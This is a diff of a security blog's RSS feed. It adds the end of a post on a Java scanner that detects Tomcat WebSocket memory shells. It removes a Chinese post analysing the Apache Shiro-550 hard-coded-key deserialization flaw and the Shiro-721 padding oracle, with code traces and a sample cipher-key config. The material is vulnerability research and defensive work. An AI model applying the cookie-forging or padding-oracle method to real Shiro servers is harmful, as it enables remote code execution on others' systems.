+&lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getEndpointConfigs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getPath&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClassLoader&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;classFileIsExists&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()))&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())));&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;已PR到：&lt;a href=&#34;https://github.com/c0ny1/java-memshell-scanner&#34;&gt;java-memshell-scanner&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;说句题外话：有一说一，用Tomcat起WebSocket服务不是那么常见，如果发现了有注册的Endpoint的话，蓝队们还需要谨慎对待。&lt;/p&gt;
+&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/veo/wsMemShell&#34;&gt;WebSocket 内存马，一种新型内存马技术&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/lqzkcx3/article/details/78507169&#34;&gt;Servlet3.0研究之ServletContainerInitializer接口&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/duanxz/p/5041110.html&#34;&gt;websocket之三：Tomcat的WebSocket实现 - duanxz&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_36586120/article/details/120025498&#34;&gt;WebSocket通信原理和在Tomcat中实现源码详解&lt;/a&gt;&lt;/p&gt;
+</description>
+                
+                
+                
+                
+                
+                    
+                        
+                            
+                                
+                                
+                                
+                                    <category domain="https://blog.wh1sper.com/categories/notes/">notes</category>
+                                
+                            
+                        
+                    
+                        
+                            
+                                
+                                
+                                
+                                    <category domain="https://blog.wh1sper.com/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</category>
+                                
+                            
+                                
+                                
+                                
+                                    <category domain="https://blog.wh1sper.com/tags/tomcat/">Tomcat</category>
+                                
+                            
+                        
+                    
+                
+            </item>
         
             <item>
                 <title>内网横向移动方法</title>
@@ -1610,190 +1961,6 @@ TrAXFilter#TrAXFilter()-&amp;gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;小手一抖，计算器到手&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042159423.png&#34; alt=&#34;56925b5f3ee5e3645eb544b3969ff793.png&#34;&gt;&lt;/p&gt;
-</description>
-                
-                
-                
-                
-                
-                    
-                        
-                            
-                                
-                                
-                                
-                                    <category domain="https://blog.wh1sper.com/categories/note/">note</category>
-                                
-                            
-                        
-                    
-                        
-                            
-                                
-                                
-                                
-                                    <category domain="https://blog.wh1sper.com/tags/shiro/">Shiro</category>
-                                
-                            
-                                
-                                
-                                
-                                    <category domain="https://blog.wh1sper.com/tags/java/">Java</category>
-                                
-                            
-                                
-                                
-                                
-                                    <category domain="https://blog.wh1sper.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</category>
-                                
-                            
-                        
-                    
-                
-            </item>
-        
-            <item>
-                <title>Shiro反序列化漏洞成因分析</title>
-                <link>https://blog.wh1sper.com/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E5%88%86%E6%9E%90/</link>
-                <guid isPermaLink="true">https://blog.wh1sper.com/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E5%88%86%E6%9E%90/</guid>
-                <pubDate>Mon, 04 Oct 2021 23:19:01 &#43;0800</pubDate>
-                
-                    <author>pwned@qq.com (wh1sper)</author>
-                
-                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
-                
-                    <description>&lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;它的原理比较简单：&lt;strong&gt;为了让浏览器或服务器重启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密Key,导致攻击者可以伪造任意的rememberMe Cookie,进而触发反序列化漏洞。&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042151507.png&#34; alt=&#34;243e118990160b756a782b94162e1cfb.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Shiro反序列化漏洞目前为止有两个，Shiro-550(Apache Shiro &amp;lt; 1.2.5)和Shiro-721( Apache Shiro &amp;lt; 1.4.2 )。这两个漏洞主要区别在于Shiro550使用已知密钥撞，后者Shiro721是使用登录后rememberMe={value}去爆破正确的key值进而反序列化，对比Shiro550条件只要有足够密钥库（条件比较低）、Shiro721需要登录（要求比较高鸡肋）。&lt;/p&gt;
-&lt;p&gt;Apache Shiro &amp;lt; 1.4.2默认使用AES/CBC/PKCS5Padding模式
-Apache Shiro &amp;gt;= 1.4.2默认使用AES/GCM/PKCS5Padding模式&lt;/p&gt;
-&lt;h2 id=&#34;shiro-550hard-code-deserialize-rce&#34;&gt;Shiro-550：Hard Code-&amp;gt;Deserialize-&amp;gt;RCE&lt;/h2&gt;
-&lt;p&gt;Shiro 550 反序列化漏洞存在版本：&lt;code&gt;shiro &amp;lt;1.2.4&lt;/code&gt;，产生原因是因为shiro接受了Cookie里面rememberMe的值，然后去进行Base64解密后，再使用aes密钥解密后的数据，进行反序列化。&lt;/p&gt;
-&lt;p&gt;这个aes密钥是硬编码（简称写死），也就是他密钥是写死在jar包里面的，众所周知AES 是对称加密，即加密密钥也同样是解密密钥，那如果我们能知道了这个密钥就可以伪造恶意cookie&lt;/p&gt;
-&lt;p&gt;接下来我们从Cookie的加密和解密过程来了解shiro-550&lt;/p&gt;
-&lt;h3 id=&#34;cookie加密过程&#34;&gt;Cookie加密过程&lt;/h3&gt;
-&lt;p&gt;直接来看shiro的CookieRememberMeManager&lt;/p&gt;
-&lt;p&gt;在&lt;code&gt;org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity&lt;/code&gt;里面，存在一个将serialized数据Base64加密然后作为Cookie返回的行为&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042152812.png&#34; alt=&#34;68c05ff91ce4b5d0bda4e3ef5a5294c7.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;我们看下哪些地方调用了这个方法，狂摁Ctrl+B:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity&amp;lt;-
-org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity&amp;lt;-
-org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(重载)&amp;lt;-
-org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042152203.png&#34; alt=&#34;d1355b042c9bb75aa20cc794ef024c0f.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;看到这个函数名都知道是登陆成功调用的，如果继续跟下去的话，会有：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;org.apache.shiro.mgt.DefaultSecurityManager#rememberMeSuccessfulLogin &amp;lt;-
-org.apache.shiro.mgt.DefaultSecurityManager#onSuccessfulLogin&amp;lt;-
-org.apache.shiro.mgt.DefaultSecurityManager#login&amp;lt;-
-……
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;会追溯到Filter之类的，大概就是：&lt;/p&gt;
-&lt;p&gt;登陆-&amp;gt;登陆成功-&amp;gt;设置Base64编码后的AES加密的Cookie&lt;/p&gt;
-&lt;p&gt;在onSuccessfulLogin方法这里下个断点&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042152804.png&#34; alt=&#34;631811c25930cc1b6d1ed4c9530d524d.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;在调用rememberIdentity之前先调用isRememberMe判断了用户是否选择了RememberMe选项，如果选了进入rememberIdentity方法&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042152864.png&#34; alt=&#34;9a1b38eb40908ae63306d4eaed1ec1be.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这个方法先创建一个PrincipalCollection对象，包含了登录信息。&lt;/p&gt;
-&lt;p&gt;随后进入rememberIdentity方法&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042152701.png&#34; alt=&#34;26d9f73c5c423aaa187501040d10c476.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这个方法调用convertPrincipalsToBytes把序列化后的PrincipalCollection对象加密，然后返回&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042152777.png&#34; alt=&#34;993fa60071dabd0240454635d6b9fada.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;而这个seriallize方法，调用org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey去获取加密的key&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042152321.png&#34; alt=&#34;5f3a1d1b9ed86f045752a2cdd9268da2.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;跟进，发现直接返回了一个属性&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042152086.png&#34; alt=&#34;c39d6952fa91d3d667017cb00a89d783.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;转到定义，这个属性貌似是预先定义好的，&lt;del&gt;虽然没看出究竟是哪里定义的&lt;/del&gt;（其实是可以看到的，详见《构造shiro poc》)&lt;/p&gt;
-&lt;p&gt;不过我们可以看到一个叫做DEFAULT_CIPHER_KEY_BYTES的东西，这个就是传说中的硬编码的shirokey&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042152168.png&#34; alt=&#34;2743873090f3be29943976ce4647b9bf.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;之后就是调用rememberSerializedIdentity返回base64加密的cookie了。&lt;/p&gt;
-&lt;p&gt;接下来康康解密过程：&lt;/p&gt;
-&lt;h3 id=&#34;cookie解密过程&#34;&gt;Cookie解密过程&lt;/h3&gt;
-&lt;p&gt;我们其实可以猜测，加密解密的功能实际上都是由这个&lt;code&gt;org.apache.shiro.web.mgt.CookieRememberMeManager&lt;/code&gt;类来实现的，在这个类里面四处找一找，可以找到getRememberedSerializedIdentity方法里面有一行：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042152497.png&#34; alt=&#34;ad7dbe2df716477c2c27e20ea47c3a7a.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这个很像获取Cookie然后去读取值的操作，在这里下个断点，带着Cookie访问服务，果然就断下来了&lt;/p&gt;
-&lt;p&gt;单步跟进，发现他获取到了我们的Cookie：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042153771.png&#34; alt=&#34;0ab70e6f2d839e52f31de004ef9f28b7.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;随后判断了一下我们Cookie的值是不是等于DELETED_COOKIE_VALUE (deleteMe)，如果不是则进行decode并且返回：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042153075.png&#34; alt=&#34;c161dcb1ad4ded67b72cbc65a73b835a.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;返回到了这里：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042153249.png&#34; alt=&#34;9cb23a32e0b8dcbd3d9030b77e63a9b7.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;并且调用convertBytesToPrincipals（这个函数名字是不是很熟悉？），将Cookie的结果转化为凭据（PrincipalCollection对象）&lt;/p&gt;
-&lt;p&gt;因为之前加密过程调用convertPrincipalsToBytes，是一个序列化过程，那这里显然就是一个反序列化过程，跟进：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042153938.png&#34; alt=&#34;f91f710ef425284287b1f10d913c6f1a.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;解密，而后反序列化；&lt;/p&gt;
-&lt;p&gt;跟进，触发点在&lt;code&gt;org.apache.shiro.io.DefaultSerializer#deserialize&lt;/code&gt;：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042153943.png&#34; alt=&#34;7a68bd2f3f5669d0c682bce50d995e31.png&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;125-版本修复&#34;&gt;1.2.5 版本修复&lt;/h3&gt;
-&lt;p&gt;修改了org.apache.shiro.mgt.AbstractRememberMeManager的硬编码方式，并且去掉了默认key，采用随机生成的shiro AES key&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042153982.png&#34; alt=&#34;fb226eec7a9aaf44b840044e8d433cd5.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;但是这个key是可以自定义的：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ENCRYPTION_KEY&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;3AvVhmFLUs0KTA3Kprsdag==&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CookieRememberMeManager&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;rememberMeManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
-        &lt;span class=&#34;n&#34;&gt;CookieRememberMeManager&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookieRememberMeManager&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CookieRememberMeManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
-        &lt;span class=&#34;n&#34;&gt;cookieRememberMeManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setCookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rememMeCookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
-        &lt;span class=&#34;c1&#34;&gt;// remeberMe cookie 加密的密钥 各个项目不一样 默认AES算法 密钥长度（128 256 512）
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;cookieRememberMeManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setCipherKey&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ENCRYPTION_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;));&lt;/span&gt;
-        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookieRememberMeManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;或者如果你使用了诸如Spring的框架：
-spring-shiro.xml
-在安全管理器SecurityManager中加入rememberMeManager；&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042153200.png&#34; alt=&#34;278339ec403dae1ff5618e3d7e8154d1.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;添加rememberMeManager，调用getCipherKey()随机生成密钥。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042154259.png&#34; alt=&#34;b779730b16239139bd286cab88dcc9d6.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;理论上只要AES加密钥泄露，都会导致反序列化漏洞&lt;/strong&gt;，也就是说，只要你硬编码，就有可能有爆破的风险&lt;/p&gt;
-&lt;h2 id=&#34;shiro-721padding-oracle-attack-shiro-aes-key-shiro550&#34;&gt;Shiro-721：Padding Oracle Attack-&amp;gt;Shiro AES key-&amp;gt;shiro550&lt;/h2&gt;
-&lt;p&gt;这个就不是重点了，shiro721本来利用需要先登陆获得有效的rememberMe={value}去爆破正确的key值进而反序列化，利用十分鸡肋。&lt;/p&gt;
-&lt;p&gt;关于Padding Oracle Attack看这篇：&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/&#34;&gt;padding oracle和cbc翻转攻击&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;CBC加密模式：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042154180.png&#34; alt=&#34;063308495a36da7002ebb344a31eafe3.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;CBC解密模式：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042154970.png&#34; alt=&#34;f36fa75edd5315a3a26c3383fe8b8cbf.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;大概过程是这样：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;比如我们的明文为admin
-则需要被填充为 admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b
-一共11个\x0b
-如果我们输入一个错误的iv，依旧是可以解密的，但是middle和我们输入的iv经过异或后得到的填充值可能出现错误
-比如本来应该是admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b
-而我们错误的得到admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x3b\x2c
-这样解密程序往往会抛出异常(Padding Error)
-应用在web里的时候，往往是302或是500报错
-而正常解密的时候是200
-所以这时，我们可以根据服务器的反应来判断我们输入的iv&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;如果发送的rememberMe可以正确解析&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042154063.png&#34; alt=&#34;9b6bb4f1012c1b4db623535cf3c94986.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;否则会抛出异常，返回deleteMe&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042154714.png&#34; alt=&#34;bfc213fa9f8693a6e6f5c9e922ceec02.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;通过这一点的不同，我们可以向服务发出一个oracle：“我这个iv解密出的padding对不对？”&lt;/p&gt;
-&lt;p&gt;如果是对的，正确解析，如果是错的返回deleteMe，基于此反复发出Oracle来爆破iv，再控制iv来控制解密后的明文（也就是不需要key了）&lt;/p&gt;
-&lt;p&gt;这里还有一点，为什么需要一个合法用户的rememberMe，因为Shiro会获取用户信息，如果不是合法用户也会返回异常从而抛出deleteMe，这样Oracle就没办法实现了。&lt;/p&gt;
-&lt;p&gt;Referer：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/225442&#34;&gt;Java安全之Shiro 550反序列化漏洞分析&lt;/a&gt;
-&lt;a href=&#34;https://sec-in.com/article/468&#34;&gt;浅谈Shiro反序列化获取Key的方式&lt;/a&gt;
-&lt;a href=&#34;https://www.anquanke.com/post/id/193165#h2-11&#34;&gt;Shiro 721 Padding Oracle攻击漏洞分析&lt;/a&gt;
-&lt;a href=&#34;https://github.com/inspiringz/Shiro-721&#34;&gt;Shiro-721 RCE Via Padding Oracle Attack&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
 </description>
                 
                 
